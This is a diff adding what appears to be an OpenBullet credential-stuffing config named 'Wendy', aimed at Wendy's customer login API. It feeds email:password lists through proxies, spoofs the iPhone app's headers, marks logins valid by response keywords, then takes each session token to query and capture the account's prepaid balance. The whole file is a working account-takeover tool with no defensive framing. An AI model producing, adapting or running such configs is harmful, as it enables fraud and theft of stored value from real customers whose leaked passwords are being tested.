@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Wendy",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-30T07:57:17.9209867+07:00",
+  "AdditionalInfo": "",
+  "Author": "MisterNoOne",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://services.wendys.com/CustomerServices/rest/login?lang=en&cntry=US&sourceCode=MY_WENDYS&version=5.6.6" AutoRedirect=TRUE 
+  CONTENT "{\"password\":\"<PASS>\",\"login\":\"<USER>\",\"deviceId\":\"EF6EA2C0-AC71-4A9B-B81B-889E402A17FE\",\"keepSignedIn\":true,\"lng\":0,\"lat\":0}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Wendys/5.6.6 (iPhone; iOS 10.2.1; Scale/1.00)" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "If you're having trouble logging in, try resetting your password" 
+  KEYCHAIN Success OR 
+    KEY "<token>" 
+#Token PARSE "<SOURCE>" LR "<token>" "</token>" Recursive=FALSE -> VAR "Token" "" "" 
+REQUEST POST "https://services.wendys.com/CustomerServices/rest/balance/prepaid?lang=en&cntry=US&sourceCode=MY_WENDYS&version=5.6.6" AutoRedirect=TRUE 
+  CONTENT "{\"lng\":0,\"deviceId\":\"EF6EA2C0-AC71-4A9B-B81B-889E402A17FE\",\"lat\":0,\"token\":\"<Token>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Wendys/5.6.6 (iPhone; iOS 10.2.1; Scale/1.00)" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "<amount>" "</amount>" Recursive=FALSE -> CAP "Balance" "$" "" 
